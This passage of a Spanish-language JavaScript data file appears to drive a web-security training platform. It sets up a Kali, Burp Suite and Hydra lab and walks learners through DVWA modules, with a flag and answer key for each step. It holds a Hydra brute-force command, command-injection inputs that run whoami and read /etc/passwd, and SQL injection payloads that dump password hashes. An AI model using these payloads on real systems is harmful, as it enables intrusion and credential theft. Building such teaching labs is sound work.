5. Ve a "Red" -> "Adaptador 1": asegúrate de que esté configurado en modo "NAT" (para navegación básica hacia internet). Si vas a conectar con la Raspberry Pi por tu misma red física, puedes añadir el "Adaptador 2" en modo "Adaptador puente" (Bridge) o "Red solo-anfitrión".
6. Haz clic en el botón "Aceptar" abajo para guardar los cambios.`,
      payload: 'RAM: 2048-4096 MB | CPUs: 2+ | Video: 128 MB | Adaptador 1: NAT',
      flag: 'FLAG{prep-kali-vm-2cpu-4gb-nat}',
      dondeEncontrarla: 'En VirtualBox -> Configuración de Kali Linux -> pestaña Red.',
      quePoner: 'Escribe el modo de red configurado en el Adaptador 1: NAT',
      flagsAceptadas: ["NAT", "nat", "Nat", "FLAG{prep-kali-vm-2cpu-4gb-nat}"],
      objetivoFlag: 'Configura la memoria RAM (2-4 GB), 2 CPUs y adaptador de red NAT en la VM de Kali Linux.'
    },
    {
      numero: 5,
      titulo: 'Primer inicio de sesion en Kali Linux',
      como: `Donde se hace: Dentro de la ventana de la máquina virtual Kali Linux en VirtualBox.

Objetivo: Encender Kali Linux por primera vez, ingresar con las credenciales oficiales por defecto y actualizar la lista de programas.

Paso a paso:
1. En VirtualBox, selecciona "Kali Linux" y haz clic en la flecha verde "Iniciar".
2. Espera 1 o 2 minutos hasta ver la pantalla azul de bienvenida con los campos de inicio de sesión.
3. Escribe las credenciales oficiales de fábrica:
   • Usuario (Username): kali
   • Contraseña (Password): kali
   (Nota: todo en minúsculas).
4. Una vez cargado el escritorio, haz clic derecho en el fondo de pantalla y elige "Open Terminal Here" (Abrir terminal aquí).
5. En la terminal negra, escribe el comando para actualizar los repositorios:
   sudo apt update
   Presiona Enter. Te pedirá contraseña: escribe kali (por seguridad en Linux no se verán asteriscos al teclear, es completamente normal) y presiona Enter.`,
      payload: 'Usuario: kali\nContrasena: kali\n\nsudo apt update',
      flag: 'FLAG{prep-kali-login-apt-upgrade-listo}',
      dondeEncontrarla: 'En la pantalla de acceso o en la terminal de Kali Linux.',
      quePoner: 'Escribe el usuario por defecto de acceso a Kali: kali',
      flagsAceptadas: ["kali", "Kali", "FLAG{prep-kali-login-apt-upgrade-listo}"],
      objetivoFlag: 'Inicia sesion con el usuario kali y contrasena kali, y actualiza los repositorios del sistema.'
    },
    {
      numero: 6,
      titulo: 'Instalacion de las Guest Additions de VirtualBox',
      como: `Donde se hace: En el menú de VirtualBox y en la terminal de Kali Linux.

Objetivo: Habilitar que Kali Linux se adapte a pantalla completa y que puedas copiar y pegar texto libremente entre tu Windows y la máquina virtual.

Paso a paso:
1. En la terminal de Kali, instala primero las herramientas de compilación con este comando:
   sudo apt install -y build-essential dkms linux-headers-$(uname -r)
2. En la barra superior de la ventana de VirtualBox (en la ventana externa), haz clic en "Dispositivos" -> "Insertar imagen de CD de las Guest Additions...".
3. En la terminal de Kali, ejecuta estos dos comandos para montar el disco e instalarlo:
   sudo mount /dev/cdrom /mnt
   sudo /mnt/VBoxLinuxAdditions.run
4. Espera a que termine la instalación y reinicia Kali ejecutando:
   sudo reboot
5. Tras reiniciar, en el menú superior de VirtualBox ve a "Dispositivos" -> "Portapapeles compartido" y asegúrate de elegir "Bidireccional".`,
      payload: 'sudo apt install -y build-essential dkms linux-headers-$(uname -r)\nsudo mount /dev/cdrom /mnt && sudo /mnt/VBoxLinuxAdditions.run\nsudo reboot',
      flag: 'FLAG{prep-guest-additions-dkms-reboot}',
      dondeEncontrarla: 'En el menú Dispositivos de VirtualBox tras completar la instalación.',
      quePoner: 'Escribe el nombre del complemento instalado: Guest Additions',
      flagsAceptadas: ["Guest Additions", "guest additions", "GuestAdditions", "FLAG{prep-guest-additions-dkms-reboot}"],
      objetivoFlag: 'Instala Guest Additions en Kali Linux para habilitar pantalla completa y portapapeles compartido.'
    },
    {
      numero: 7,
      titulo: 'Descarga e instalacion de Burp Suite Community Edition',
      como: `Donde se hace: En Kali Linux (o en Windows si prefieres usarlo fuera de la VM).

Objetivo: Abrir Burp Suite, la herramienta esencial de auditoría web que nos permite interceptar, analizar y modificar el tráfico entre el navegador y las aplicaciones web.

Paso a paso:
1. ¡Buenas noticias!: En Kali Linux, Burp Suite ya viene preinstalado. Puedes abrirlo haciendo clic en el menú del dragón de Kali (arriba a la izquierda) -> "03 - Web Application Analysis" -> "burpsuite", o simplemente abriendo una terminal y escribiendo: burpsuite
2. Si prefieres usarlo en tu Windows anfitrión, puedes descargarlo gratis desde: https://portswigger.net/burp/communitydownload
3. Al abrir Burp Suite verás una ventana de bienvenida:
   • Deja seleccionada la opción "Temporary project" y haz clic en "Next".
   • Deja seleccionada la opción "Use Burp defaults" y haz clic en "Start Burp".
4. Se abrirá la interfaz principal con pestañas superiores como Dashboard, Target, Proxy, Intruder, Repeater.`,
      payload: 'burpsuite\nhttps://portswigger.net/burp/communitydownload',
      flag: 'FLAG{prep-burpsuite-community-listo}',
      dondeEncontrarla: 'En la ventana principal de Burp Suite tras iniciar el proyecto.',
      quePoner: 'Escribe el nombre de la herramienta: Burp Suite',
      flagsAceptadas: ["Burp Suite", "burp suite", "burpsuite", "BurpSuite", "FLAG{prep-burpsuite-community-listo}"],
      objetivoFlag: 'Ejecuta Burp Suite Community Edition y arranca un proyecto temporal por defecto.'
    },
    {
      numero: 8,
      titulo: 'Configuracion del Proxy Listener en Burp Suite',
      como: `Donde se hace: Dentro del programa Burp Suite.

Objetivo: Verificar que el proxy local esté activo y listo para escuchar el tráfico en el puerto 8080.

Paso a paso:
1. En Burp Suite, haz clic en la pestaña superior "Proxy".
2. Luego haz clic en la subpestaña "Proxy settings" (o pestaña "Options" en versiones clásicas).
3. En la sección "Proxy listeners" verás una tabla con una dirección. Debe decir:
   • Interface: 127.0.0.1:8080
   • Running: Debe tener la casilla marcada con un check.
4. Si la casilla está desmarcada, haz clic sobre ella para activarla. Si no existiera la fila, haz clic en "Add", escribe el puerto 8080, elige "Loopback only" (127.0.0.1) y haz clic en "OK".`,
      payload: 'Host: 127.0.0.1 | Puerto: 8080 | Estado: Activo (check verde)',
      flag: 'FLAG{prep-burp-proxy-listener-8080-on}',
      dondeEncontrarla: 'En Burp Suite -> pestaña Proxy -> Proxy Settings -> tabla Proxy Listeners.',
      quePoner: 'Escribe el número de puerto donde escucha el proxy: 8080',
      flagsAceptadas: ["8080", "127.0.0.1:8080", "FLAG{prep-burp-proxy-listener-8080-on}"],
      objetivoFlag: 'Verifica en Proxy Settings de Burp Suite que el listener en 127.0.0.1:8080 se encuentre activo con check verde.'
    },
    {
      numero: 9,
      titulo: 'Descarga e instalacion del certificado CA de Burp Suite',
      como: `Donde se hace: En el navegador Firefox (dentro de Kali o en Windows).

Objetivo: Instalar el certificado de seguridad de Burp Suite en Firefox para poder navegar en páginas seguras HTTPS sin que aparezcan errores ni advertencias de peligro.

Paso a paso:
1. Con Burp Suite abierto, abre Firefox.
2. Ve al menú de Firefox (tres líneas arriba a la derecha) -> "Ajustes" -> escribe "proxy" en el buscador y haz clic en "Configuración...".
3. Marca "Configuración manual del proxy", pon en Proxy HTTP: 127.0.0.1 y en Puerto: 8080. Marca la casilla "Usar también este proxy para HTTPS" y haz clic en "Aceptar".
4. En la barra de direcciones de Firefox escribe: http://burpsuite y presiona Enter.
5. En la esquina superior derecha de la página que cargue, haz clic en el botón "CA Certificate". Se descargará un archivo llamado cacert.der.
6. Vuelve a los Ajustes de Firefox, escribe "certificados" y haz clic en el botón "Ver certificados...".
7. Ve a la pestaña "Autoridades", haz clic en "Importar...", selecciona el archivo cacert.der descargado, marca la casilla "Confiar en esta CA para identificar sitios web" y pulsa "Aceptar".
8. Regresa a la configuración de red de Firefox y déjalo temporalmente en "Sin proxy" (en el siguiente paso usaremos una extensión para activarlo con un solo clic).`,
      payload: 'http://burpsuite -> Boton "CA Certificate" -> cacert.der\nFirefox: Ajustes -> Certificados -> Importar -> cacert.der',
      flag: 'FLAG{prep-burp-cacert-firefox-confiado}',
      dondeEncontrarla: 'En Firefox -> Ajustes -> Certificados -> pestaña Autoridades (PortSwigger).',
      quePoner: 'Escribe el nombre de la empresa creadora del certificado: PortSwigger (o el archivo cacert.der).',
      flagsAceptadas: ["PortSwigger", "portswigger", "cacert.der", "Portswigger", "FLAG{prep-burp-cacert-firefox-confiado}"],
      objetivoFlag: 'Descarga cacert.der desde http://burpsuite e importalo en Autoridades de Firefox marcando confianza para sitios web.'
    },
    {
      numero: 10,
      titulo: 'Instalacion y configuracion de FoxyProxy en Firefox',
      como: `Donde se hace: En tu navegador Firefox.

Objetivo: Agregar un botón práctico en Firefox que te permita encender o apagar el envío de tráfico a Burp Suite con un solo clic, sin desconfigurar tu navegador.

Paso a paso:
1. En Firefox, entra a la tienda oficial de complementos:
   https://addons.mozilla.org/firefox/addon/foxyproxy-standard/
2. Haz clic en "Añadir a Firefox" y luego en "Añadir" en el diálogo emergente.
3. Verás un nuevo icono con forma de zorro arriba a la derecha. Haz clic en él y elige "Options" (Opciones).
4. Haz clic en el botón "Add" (Añadir) para crear un nuevo perfil:
   • Title/Name: Burp
   • Proxy Type: HTTP
   • Hostname: 127.0.0.1
   • Port: 8080
5. Haz clic en "Save" (Guardar).
6. Cada vez que vayas a realizar un laboratorio, haz clic en el zorrito y selecciona el perfil "Burp". Cuando termines el ejercicio, cámbialo a "Turn Off" o "Disable" para navegar con normalidad por internet.`,
      payload: 'Firefox Add-on: FoxyProxy Standard\nPerfil Burp: HTTP | 127.0.0.1 | Puerto 8080',
      flag: 'FLAG{prep-firefox-foxyproxy-burp-guardado}',
      dondeEncontrarla: 'En la extensión FoxyProxy en la lista de perfiles creados.',
      quePoner: 'Escribe el nombre que le diste al perfil creado: Burp',
      flagsAceptadas: ["Burp", "burp", "BURP", "FLAG{prep-firefox-foxyproxy-burp-guardado}"],
      objetivoFlag: 'Instala FoxyProxy Standard en Firefox y crea el perfil Burp direccionando al puerto 8080.'
    },
    {
      numero: 11,
      titulo: 'Instalacion de Hydra y diccionario rockyou en Kali Linux',
      como: `Donde se hace: En la terminal de Kali Linux.

Objetivo: Dejar listo el programa Hydra y el diccionario de contraseñas rockyou.txt para los laboratorios de pruebas de autenticación.

Paso a paso:
1. Abre una terminal en Kali Linux.
2. Comprueba que Hydra esté instalado escribiendo:
   hydra --version
   (En Kali ya viene preinstalado; si no apareciera, instálalo con: sudo apt install -y hydra).
3. Kali incluye una lista famosa con millones de contraseñas llamada rockyou.txt.gz, pero viene comprimida. Para descomprimirla y dejarla lista, ejecuta este comando:
   sudo gunzip /usr/share/wordlists/rockyou.txt.gz
4. Verifica que ya esté descomprimida escribiendo:
   ls -lh /usr/share/wordlists/rockyou.txt
   (Verás que pesa unos 134 MB con millones de contraseñas reales).`,
      payload: 'hydra --version\nsudo gunzip /usr/share/wordlists/rockyou.txt.gz\nls -lh /usr/share/wordlists/rockyou.txt',
      flag: 'FLAG{prep-hydra-rockyou-descomprimido}',
      dondeEncontrarla: 'En la terminal de Kali Linux tras ejecutar ls en /usr/share/wordlists/.',
      quePoner: 'Escribe el nombre del archivo de contraseñas descomprimido: rockyou.txt',
      flagsAceptadas: ["rockyou.txt", "rockyou", "rockyou.txt.gz", "FLAG{prep-hydra-rockyou-descomprimido}"],
      objetivoFlag: 'Confirma hydra --version y descomprime la lista rockyou.txt en el directorio de wordlists de Kali.'
    },
    {
      numero: 12,
      titulo: 'Configuracion de red para alcanzar la Raspberry Pi',
      como: `Donde se hace: En tu red local y en la terminal de tu computadora o de Kali.

Objetivo: Conocer la dirección IP asignada a tu Raspberry Pi (donde están instalados los laboratorios) y verificar que responde correctamente.

Paso a paso:
1. Asegúrate de que la Raspberry Pi esté encendida y conectada al mismo router o red Wi-Fi/cable que tu máquina.
2. Para conocer su dirección IP puedes:
   • Conectar pantalla y teclado a la Pi y escribir: hostname -I
   • O mirar la lista de dispositivos conectados en el panel de administración de tu router.
3. Abre una terminal en tu equipo y comprueba la comunicación enviando un paquete de prueba:
   ping <IP_DE_TU_PI> (por ejemplo: ping 192.168.1.50)
4. Si recibes respuestas como "bytes=32 tiempo=... TTL=...", la conexión es exitosa.
5. Anota esa dirección IP: la ingresarás en la casilla superior de esta plataforma web para abrir los laboratorios:
   • DVWA: http://<IP_PI>/dvwa/
   • Juice Shop: http://<IP_PI>:3000`,
      payload: 'hostname -I\nping <IP_PI>\n\nDVWA: http://<IP_PI>/dvwa/\nJuice Shop: http://<IP_PI>:3000',
      flag: 'FLAG{prep-ping-raspberrypi-conectado}',
      dondeEncontrarla: 'En la terminal tras enviar la orden ping exitosa.',
      quePoner: 'Escribe el nombre del comando usado para comprobar la conexión: ping',
      flagsAceptadas: ["ping", "PING", "ping <IP_PI>", "FLAG{prep-ping-raspberrypi-conectado}"],
      objetivoFlag: 'Obten la direccion IP de la Raspberry Pi y verifica que responda al comando ping desde tu maquina.'
    },
    {
      numero: 13,
      titulo: 'Verificacion final: Prueba de intercepcion con Burp Suite',
      como: `Donde se hace: Con Firefox y Burp Suite trabajando de forma conjunta.

Objetivo: Aprender a pausar una petición web antes de que llegue a internet, inspeccionar su contenido y dejarla continuar.

Paso a paso:
1. Abre Burp Suite y ve a la pestaña superior "Proxy" -> subpestaña "Intercept".
2. Asegúrate de que el botón diga "Intercept is on" (activado). Si dice "Intercept is off", haz clic en él para activarlo.
3. En tu navegador Firefox, haz clic en el icono del zorrito de FoxyProxy y selecciona el perfil "Burp".
4. En la barra de direcciones de Firefox, entra a la dirección de DVWA:
   http://<IP_PI>/dvwa/
   y presiona Enter.
5. Notarás que Firefox parece quedarse pensando... ¡Eso es normal y significa que funcionó!
6. Cambia a la ventana de Burp Suite: verás la petición web detenida en texto claro, mostrando encabezados HTTP y cookies.
7. Haz clic en el botón "Forward" (Adelantar) en Burp Suite para dejar pasar la solicitud hacia el servidor.
8. Vuelve a Firefox y verás que la página de DVWA acaba de cargar por completo.
9. ¡Enhorabuena! Tu entorno de laboratorio está 100% configurado y listo para comenzar los retos.`,
      payload: 'Proxy -> Intercept is on -> Navega a http://<IP_PI>/dvwa/ -> Forward\nHistorial: Proxy -> HTTP history',
      flag: 'FLAG{prep-burp-intercepcion-dvwa-exitosa}',
      dondeEncontrarla: 'En la primera línea de la petición capturada en Burp Suite.',
      quePoner: 'Escribe el método HTTP que viste en la primera línea de la petición: GET',
      flagsAceptadas: ["GET", "get", "Get", "FLAG{prep-burp-intercepcion-dvwa-exitosa}"],
      objetivoFlag: 'Activa la intercepcion con FoxyProxy en modo Burp y envia una peticion HTTP a DVWA haciendo Forward con exito.'
    }
  ]
};

export const ROADMAP_MODULOS = {
  DVWA: {
    nombre: 'Damn Vulnerable Web Application (DVWA)',
    categoria: 'OWASP Top 10 Clasico',
    modulos: [
      {
        id: 'dvwa-brute-force',
        numero: 1,
        titulo: 'Fuerza Bruta en Autenticacion',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Inicio de sesion en DVWA y ajuste del nivel de seguridad',
            como: `Donde se hace: En el navegador Firefox (asegúrate de que en Burp Suite "Intercept is off" para navegar libremente).

Objetivo: Iniciar sesión por primera vez en la aplicación de práctica DVWA y fijar la dificultad en el nivel más sencillo ("Low").

Paso a paso:
1. Abre Firefox y navega a la URL de DVWA en tu Raspberry Pi (por ejemplo: http://192.168.1.50/dvwa/).
2. En la pantalla de bienvenida, escribe las credenciales por defecto:
   • Username: admin
   • Password: password
   Luego haz clic en el botón azul "Login".
3. En el menú lateral izquierdo de DVWA, busca y haz clic en la opción "DVWA Security".
4. En el menú desplegable, selecciona "Low" (Bajo) y presiona el botón "Submit".

¿Por qué hacemos esto?: El nivel "Low" desactiva todas las protecciones del código para que puedas ver y entender con total claridad cómo ocurren los fallos de seguridad sin toparte con filtros complejos.

Como saber que funciono: En la parte inferior de la pantalla o en el mensaje verde verás: "Security Level set to low".`,
            payload: 'Usuario: admin\nContrasena: password\nSecurity Level: Low',
            flag: 'FLAG{dvwa-security-low-ready}',
            dondeEncontrarla: 'En la pantalla de DVWA, observando el mensaje de confirmación o el pie de página.',
            quePoner: 'Escribe el nivel de seguridad configurado: low',
            flagsAceptadas: ["low", "Low", "LOW", "Security Level set to low", "FLAG{dvwa-security-low-ready}"],
            objetivoFlag: 'Ingresa la flag una vez hayas iniciado sesion correctamente como admin y veas "Security Level set to low" en DVWA.'
          },
          {
            numero: 2,
            titulo: 'Capturar peticion de autenticacion con Burp Suite',
            como: `Donde se hace: Con Firefox y Burp Suite trabajando juntos.

Objetivo: "Pausar" en el aire un intento de inicio de sesión para ver qué datos envía el navegador hacia el servidor.

Paso a paso:
1. En el menú lateral izquierdo de DVWA, haz clic en la sección "Brute Force".
2. Ve a Burp Suite, entra a la pestaña "Proxy" -> "Intercept" y asegúrate de que el botón diga "Intercept is on" (activado).
3. En Firefox, activa el perfil "Burp" en tu extensión FoxyProxy.
4. En el formulario de login de DVWA, escribe un usuario cualquiera (ej: admin) y una contraseña inventada (ej: prueba123), y haz clic en el botón "Login".
5. Cambia a la ventana de Burp Suite: verás la petición detenida en pantalla. Observa la primera línea que empieza con:
   GET /dvwa/vulnerabilities/brute/?username=admin&password=prueba123...

¿Qué significa esto?: Los datos viajan en texto plano como parámetros en la propia dirección web (URL) mediante el método HTTP GET.`,
            payload: 'GET /dvwa/vulnerabilities/brute/?username=admin&password=test&Login=Login',
            flag: 'FLAG{brute-get-params-captured}',
            dondeEncontrarla: 'En Burp Suite en Proxy -> Intercept, en la primera línea de la solicitud GET capturada.',
            quePoner: 'Escribe el nombre del parámetro donde viaja el usuario: username',
            flagsAceptadas: ["username", "admin", "username=admin", "FLAG{brute-get-params-captured}"],
            objetivoFlag: 'Ingresa la flag cuando veas la peticion GET interceptada en Burp Suite con los parametros username y password visibles.'
          },
          {
            numero: 3,
            titulo: 'Identificar mensaje de fallo',
            como: `Donde se hace: En Burp Suite y en el navegador Firefox.

Objetivo: Descubrir qué mensaje exacto muestra la página web cuando la contraseña es errónea, para que una herramienta automática sepa cuándo falló un intento.

Paso a paso:
1. En Burp Suite, haz clic en el botón "Forward" para dejar pasar la petición con contraseña errónea.
2. En Firefox, desactiva temporalmente el proxy (en FoxyProxy elige "Disable" o en Burp pon "Intercept is off").
3. Observa el mensaje de error rojo que aparece debajo del formulario en DVWA. Dice textualmente:
   Username and/or password incorrect.

¿Por qué es necesario?: Los programas automáticos de ataque no ven la pantalla como una persona; necesitan buscar esa frase textual en el código recibido para saber si la contraseña fue rechazada o si lograron entrar.`,
            payload: 'Cadena de fallo: Username and/or password incorrect.',
            flag: 'FLAG{brute-fail-string-identified}',
            dondeEncontrarla: 'En el mensaje de error rojo que muestra DVWA tras enviar una contraseña incorrecta.',
            quePoner: 'Escribe el mensaje de error que viste: Username and/or password incorrect.',
            flagsAceptadas: ["Username and/or password incorrect.", "Username and/or password incorrect", "username and/or password incorrect.", "incorrect", "FLAG{brute-fail-string-identified}"],
            objetivoFlag: 'Ingresa la flag cuando puedas leer el mensaje exacto de error en la respuesta HTTP de DVWA para credenciales incorrectas.'
          },
          {
            numero: 4,
            titulo: 'Lanzar ataque automatizado con Hydra',
            como: `Donde se hace: En la terminal de tu máquina Kali Linux.

Objetivo: Usar la herramienta Hydra para probar automáticamente miles de contraseñas por segundo desde el diccionario rockyou.txt hasta descifrar la clave del administrador.

Paso a paso:
1. Para que el servidor reconozca tu sesión de DVWA, necesitas tu cookie llamada PHPSESSID.
2. En Firefox (con sesión iniciada en DVWA), presiona F12 para abrir las herramientas de desarrollador. Ve a "Almacenamiento" (o "Storage") -> "Cookies" -> haz clic en la IP de tu Pi y copia el valor de la fila PHPSESSID (es una cadena alfanumérica).
3. En la terminal de Kali Linux, pega este comando reemplazando <IP_LAB> por la IP de tu Raspberry Pi y <COOKIE> por el valor de tu PHPSESSID:
   hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"
4. Presiona Enter. Hydra comenzará a probar palabras hasta que se detenga y muestre en verde:
   [80][http-get-form] host: <IP> login: admin password: password

¿Qué hace este comando?: -l define el usuario objetivo (admin), -P indica la lista de contraseñas rockyou.txt, y :F=incorrect le dice a Hydra que ignore las respuestas que contengan la palabra "incorrect".`,
            payload: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP_LAB> http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:F=incorrect:H=Cookie: security=low; PHPSESSID=<COOKIE>"',
            flag: 'FLAG{hydra-cracked-admin-password}',
            dondeEncontrarla: 'En la salida de tu terminal de Kali Linux al terminar Hydra, en la línea que indica password encontrada.',
            quePoner: 'Escribe la contraseña que descubrió Hydra para admin: password',
            flagsAceptadas: ["password", "Password", "admin:password", "FLAG{password}", "FLAG{hydra-cracked-admin-password}"],
            objetivoFlag: 'Ingresa la flag cuando Hydra muestre en pantalla "[80][http-get-form] host: <IP> login: admin password: password" confirmando la contrasena encontrada.'
          }
        ]
      },
      {
        id: 'dvwa-command-injection',
        numero: 2,
        titulo: 'Inyeccion de Comandos del Sistema',
        nivel: 'Basico',
        pasos: [
          {
            numero: 1,
            titulo: 'Verificar funcionamiento legitimo',
            como: `Donde se hace: En Firefox, en la sección "Command Injection" de DVWA.

Objetivo: Comprender cuál es el uso legítimo previsto para este formulario (comprobar la conectividad enviando un ping a una dirección IP).

Paso a paso:
1. En el menú lateral de DVWA, haz clic en "Command Injection".
2. En la casilla "Enter an IP address", escribe: 127.0.0.1 (la dirección local de tu propio equipo).
3. Haz clic en el botón "Submit".
4. Espera 2 o 3 segundos. Verás aparecer un cuadro negro con la respuesta típica del comando ping generado internamente por la Raspberry Pi.

¿Qué está ocurriendo?: El servidor web toma el texto que escribiste y ejecuta internamente en el sistema operativo Linux la orden: ping -c 4 127.0.0.1.`,
            payload: '127.0.0.1',
            flag: 'FLAG{cmdi-ping-response-seen}',
            dondeEncontrarla: 'En el recuadro negro debajo del formulario donde se muestra la salida del comando ping.',
            quePoner: 'Escribe el tamaño en bytes de los paquetes reportado en el ping: 64 bytes (o simplemente 64)',
            flagsAceptadas: ["64 bytes", "64", "64 bytes from 127.0.0.1", "FLAG{cmdi-ping-response-seen}"],
            objetivoFlag: 'Ingresa la flag cuando veas la salida del comando ping devuelta por el servidor, con lineas como "64 bytes from 127.0.0.1" en la pagina.'
          },
          {
            numero: 2,
            titulo: 'Concatenar segundo comando con punto y coma',
            como: `Donde se hace: En el mismo campo "Enter an IP address" de Command Injection en DVWA.

Objetivo: Engañar al servidor para que, además del ping, ejecute un segundo comando del sistema operativo que nosotros elijamos.

Paso a paso:
1. En la casilla "Enter an IP address", escribe la IP seguida de un punto y coma y la orden whoami:
   127.0.0.1; whoami
2. Haz clic en "Submit".
3. Mira la parte inferior del recuadro negro de resultados: justo debajo del ping verás aparecer la palabra www-data.

¿Por qué funciona?: En Linux, el símbolo punto y coma (;) sirve para separar dos órdenes independientes. El servidor ejecuta el ping y enseguida ejecuta whoami ("¿quién soy?"). Como el servidor web corre bajo el usuario web del sistema operativo, responde www-data.`,
            payload: '127.0.0.1; whoami',
            flag: 'FLAG{cmdi-whoami-www-data}',
            dondeEncontrarla: 'En el recuadro negro de la página justo debajo del resultado de ping, donde aparece el usuario.',
            quePoner: 'Escribe el nombre del usuario web del sistema que apareció: www-data',
            flagsAceptadas: ["www-data", "www data", "FLAG{www-data}", "FLAG{cmdi-whoami-www-data}"],
            objetivoFlag: 'Ingresa la flag cuando veas "www-data" impreso en la respuesta como resultado del comando whoami ejecutado en el servidor.'
          },
          {
            numero: 3,
            titulo: 'Extraer cuentas del sistema operativo',
            como: `Donde se hace: En la casilla "Enter an IP address" de Command Injection en DVWA.

Objetivo: Leer el archivo confidencial /etc/passwd del sistema Linux de la Raspberry Pi para listar las cuentas de usuario existentes.

Paso a paso:
1. En la casilla de texto, escribe la orden para leer el archivo del sistema:
   127.0.0.1; cat /etc/passwd
2. Haz clic en el botón "Submit".
3. La página mostrará una lista completa de cuentas del sistema operativo, comenzando por el superusuario root:x:0:0:root:...

¿Cuál es la lección de seguridad?: Nunca se debe concatenar directamente la entrada de un usuario en un comando del sistema. Los atacantes pueden usar esto para tomar control absoluto del servidor.`,
            payload: '127.0.0.1; cat /etc/passwd',
            flag: 'FLAG{cmdi-etcpasswd-dumped}',
            dondeEncontrarla: 'En la salida de texto en pantalla, observando la primera cuenta del archivo con UID 0.',
            quePoner: 'Escribe el nombre del superusuario con UID 0 que aparece al inicio: root',
            flagsAceptadas: ["root", "root:x:0:0:root", "FLAG{root}", "FLAG{cmdi-etcpasswd-dumped}"],
            objetivoFlag: 'Ingresa la flag cuando veas el contenido de /etc/passwd mostrado en la pagina, con lineas como "root:x:0:0:root" y "www-data:x:33:33".'
          }
        ]
      },
      {
        id: 'dvwa-sqli',
        numero: 3,
        titulo: 'Inyeccion SQL',
        nivel: 'Intermedio',
        pasos: [
          {
            numero: 1,
            titulo: 'Provocar fallo de sintaxis en la consulta',
            como: `Donde se hace: En Firefox, en la sección "SQL Injection" de DVWA.

Objetivo: Romper intencionalmente la consulta de base de datos introduciendo una comilla simple (') para comprobar si la entrada no está protegida.

Paso a paso:
1. En el menú de DVWA, haz clic en "SQL Injection".
2. En la casilla "User ID", escribe únicamente una comilla simple: '
3. Haz clic en el botón "Submit".
4. Verás aparecer un mensaje de error técnico de base de datos en color rojo o negro:
   You have an error in your SQL syntax; check the manual that corresponds to your MariaDB/MySQL server version...

¿Por qué ocurre esto?: El programador escribió internamente algo como SELECT ... WHERE user_id = '$id'. Al enviar una comilla, la consulta queda con tres comillas desparejadas, la base de datos se confunde y arroja error. ¡Eso confirma que el campo es vulnerable!`,
            payload: "'",
            flag: 'FLAG{sqli-mysql-error-visible}',
            dondeEncontrarla: 'En el mensaje de error de sintaxis SQL que aparece en la página.',
            quePoner: 'Escribe el motor de base de datos mencionado en el error: MySQL (o MariaDB)',
            flagsAceptadas: ["MySQL", "mysql", "MariaDB", "mariadb", "FLAG{sqli-mysql-error-visible}"],
            objetivoFlag: 'Ingresa la flag cuando veas el mensaje de error SQL de MySQL en la pagina, con texto como "You have an error in your SQL syntax".'
          },
          {
            numero: 2,
            titulo: 'Evasion booleana de la condicion',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Hacer que la base de datos nos devuelva TODOS los usuarios en lugar de uno solo, usando una condición lógica que siempre sea verdadera ('1'='1').

Paso a paso:
1. En la casilla "User ID", escribe exactamente:
   1' OR '1'='1
2. Haz clic en "Submit".
3. En vez de mostrarte solo un registro, la página te devolverá la lista completa de todos los usuarios de la base de datos: admin, gordonb, 1337, pablo, smithy.

¿Por qué funciona?: La consulta se transforma en: "Trae el usuario 1 O donde 1 sea igual a 1". Como uno siempre es igual a uno en matemáticas, la condición se cumple para todas las filas y la base de datos devuelve la tabla entera.`,
            payload: "1' OR '1'='1",
            flag: 'FLAG{sqli-all-users-bypassed}',
            dondeEncontrarla: 'En la lista de resultados de usuarios devuelta por DVWA.',
            quePoner: 'Escribe el primer nombre de usuario que aparece en la lista: admin',
            flagsAceptadas: ["admin", "Admin", "FLAG{admin}", "FLAG{sqli-all-users-bypassed}"],
            objetivoFlag: 'Ingresa la flag cuando la pagina muestre todos los usuarios de la base de datos (admin, gordonb, 1337, pablo, smithy) en una sola respuesta.'
          },
          {
            numero: 3,
            titulo: 'Determinar numero de columnas con ORDER BY',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Averiguar cuántas columnas devuelve la consulta original (un dato fundamental antes de poder pedirle contraseñas a la base de datos).

Paso a paso:
1. En "User ID", escribe: 1' ORDER BY 1 # y haz clic en Submit (verás que responde bien).
2. Ahora escribe: 1' ORDER BY 2 # y haz clic en Submit (sigue respondiendo bien).
3. Ahora escribe: 1' ORDER BY 3 # y haz clic en Submit: la página dará un error como "Unknown column '3' in 'order list'".

¿Qué significa esto?: Cuando ordenas por 2 columnas funciona, pero al pedir la columna 3 falla. Eso demuestra que la consulta original tiene exactamente 2 columnas. El símbolo # sirve para anular o comentar el resto del código SQL original.`,
            payload: "1' ORDER BY 2 #",
            flag: 'FLAG{sqli-2-columns-confirmed}',
            dondeEncontrarla: 'Al verificar con qué número responde bien y con cuál da error de columna desconocida.',
            quePoner: 'Escribe el número exacto de columnas que contiene la consulta: 2',
            flagsAceptadas: ["2", "dos", "2 columnas", "FLAG{sqli-2-columns-confirmed}"],
            objetivoFlag: 'Ingresa la flag cuando ORDER BY 2 funcione sin error pero ORDER BY 3 devuelva error, confirmando que la consulta tiene exactamente 2 columnas.'
          },
          {
            numero: 4,
            titulo: 'Extraer usuarios y hashes de contrasenas',
            como: `Donde se hace: En la casilla "User ID" de SQL Injection en DVWA.

Objetivo: Usar la cláusula UNION SELECT para robar los usuarios y las contraseñas cifradas guardadas en la tabla users.

Paso a paso:
1. En la casilla "User ID", escribe:
   1' UNION SELECT user, password FROM users #
2. Haz clic en "Submit".
3. La página mostrará los nombres de usuario acompañados por sus contraseñas en formato hash MD5 (un texto largo de 32 caracteres).
4. Para el usuario admin, verás el hash:
   5f4dcc3b5aa765d61d8327deb882cf99
   (este hash corresponde a la palabra "password").

¿Cómo funciona UNION SELECT?: UNION permite combinar el resultado de la consulta original con una consulta propia. Como ya sabíamos que requería 2 columnas, le pedimos las columnas user y password de la tabla users.`,
            payload: "1' UNION SELECT user, password FROM users #",
            flag: 'FLAG{sqli-md5-hashes-dumped}',
            dondeEncontrarla: 'En la tabla de resultados de DVWA junto al usuario admin.',
            quePoner: 'Escribe el hash MD5 de la contraseña de admin: 5f4dcc3b5aa765d61d8327deb882cf99',
